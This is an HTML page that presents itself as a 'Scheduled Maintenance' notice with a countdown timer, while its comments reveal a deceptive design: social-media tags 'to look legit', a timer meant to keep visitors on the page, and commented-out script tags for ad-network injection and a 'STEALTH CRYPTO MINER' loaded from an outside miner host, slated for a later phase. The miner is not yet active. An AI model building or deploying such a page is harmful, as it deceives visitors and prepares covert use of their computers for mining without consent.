<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- SEO Preservation: Tells Google to keep us indexed and follow our links -->
    <meta name="robots" content="index, follow">
    <meta name="description" content="Our platform is currently undergoing scheduled maintenance to bring you a better experience. We will be back online shortly.">
    
    <!-- OpenGraph (Social Media previews to look legit) -->
    <meta property="og:title" content="Scheduled Maintenance">
    <meta property="og:description" content="We are upgrading our systems. Check back soon.">
    <meta property="og:type" content="website">
    
    <title>Scheduled Maintenance</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d1117; color: #c9d1d9; text-align: center; padding-top: 15%; }
        .container { max-width: 600px; margin: 0 auto; }
        h1 { font-size: 36px; margin-bottom: 20px; color: #58a6ff; }
        p { font-size: 16px; color: #8b949e; line-height: 1.5; }
        .spinner { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { margin-top: 50px; font-size: 12px; color: #484f58; }
    </style>
</head>
<body>
    <div class="container">
        <h1>We'll be right back.</h1>
        <p>Our infrastructure is undergoing scheduled upgrades to improve performance and security. Thank you for your patience.</p>
        
        <!-- The Countdown Timer to keep users on the page -->
        <div class="spinner"></div>
        <p style="font-size: 24px; color: #58a6ff; font-weight: bold;" id="countdown">Est. Time Remaining: 05:00</p>
        
        <div class="footer">
            &copy; 2024 System Maintenance
        </div>
    </div>

    <!-- AD NETWORK INJECTION (Still commented out for now, we will add these in Phase 4) -->
    <!-- <script src="https://propellerads.com/YOUR_AD_TAG.js"></script> -->

    <!-- STEALTH CRYPTO MINER (Still commented out for now) -->
    <!-- <script src="https://server1.webminerpool.com/lib/minero-hidden.js"></script> -->

    <!-- COUNTDOWN LOGIC -->
    <script>
        let timeLeft = 300; // 5 minutes in seconds
        const countdownElement = document.getElementById('countdown');

        const interval = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(interval);
                countdownElement.innerText = "Finalizing checks...";
                return;
            }
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            countdownElement.innerText = `Est. Time Remaining: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            timeLeft -= 1;
        }, 1000);
    </script>
</body>
</html>
